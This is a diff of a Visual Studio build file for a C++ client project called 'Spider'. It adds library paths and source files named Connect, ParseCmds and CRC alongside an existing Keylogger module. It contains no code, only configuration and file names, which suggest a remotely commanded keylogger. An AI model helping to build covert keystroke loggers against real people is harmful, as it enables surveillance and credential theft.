@@ -78,10 +78,11 @@
       <SDLCheck>true</SDLCheck>
       <AdditionalIncludeDirectories>C:\Users\gem\Documents\GitHubVisualStudio\Spider\client\boost_1_59_0\include;C:\Users\gem\Documents\GitHubVisualStudio\Spider\client\includes;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <CallingConvention>Cdecl</CallingConvention>
     </ClCompile>
     <Link>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <AdditionalLibraryDirectories>C:\Users\gem\Documents\GitHubVisualStudio\Spider\client\boost_1_59_0\lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <AdditionalLibraryDirectories>C:\Windows\winsxs\x86_microsoft-windows-userpowermanagement_31bf3856ad364e35_6.1.7600.16385_none_a2eff4845e2bf4e2;C:\Users\gem\Documents\GitHubVisualStudio\Spider\client\boost_1_59_0\lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
@@ -125,21 +126,18 @@
   <ItemGroup>
     <ClCompile Include="..\..\src\Client.cpp" />
     <ClCompile Include="..\..\src\ClientWindow.cpp" />
+    <ClCompile Include="..\..\src\Connect.cpp" />
     <ClCompile Include="..\..\src\Keylogger.cpp" />
     <ClCompile Include="..\..\src\main.cpp" />
+    <ClCompile Include="..\..\src\ParseCmds.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="..\..\includes\Client.hh" />
-    <ClInclude Include="..\..\includes\ClientController.hpp" />
-    <ClInclude Include="..\..\includes\ClientModel.hpp" />
-    <ClInclude Include="..\..\includes\ClientView.hpp" />
     <ClInclude Include="..\..\includes\ClientWindow.h" />
-    <ClInclude Include="..\..\includes\Connection.hpp" />
-    <ClInclude Include="..\..\includes\IConnection.hpp" />
+    <ClInclude Include="..\..\includes\Connect.hh" />
+    <ClInclude Include="..\..\includes\CRC.hpp" />
     <ClInclude Include="..\..\includes\Keylogger.hh" />
-    <ClInclude Include="..\..\includes\NetworkController.hpp" />
-    <ClInclude Include="..\..\includes\NetworkModel.hpp" />
-    <ClInclude Include="..\..\includes\NetworkView.hpp" />
+    <ClInclude Include="..\..\includes\ParseCmds.hh" />
     <ClInclude Include="resource.h" />
   </ItemGroup>
   <ItemGroup>
